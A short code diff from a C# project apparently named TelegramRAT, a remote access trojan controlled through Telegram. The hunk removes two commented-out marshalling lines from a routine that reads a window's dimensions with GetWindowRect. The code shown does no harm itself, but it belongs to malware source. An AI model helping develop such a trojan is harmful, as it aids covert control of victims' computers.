@@ -146,8 +146,6 @@ namespace TelegramRAT
         {
             Rectangle rect = new Rectangle();
             Rectangle* ptr = &rect;
-            //IntPtr rectHandle = IntPtr.Zero;
-            //Marshal.StructureToPtr(rect, rectHandle, true);
             GetWindowRect(hWnd, ptr);
             rect.Width -= rect.X;
             rect.Height -= rect.Y;
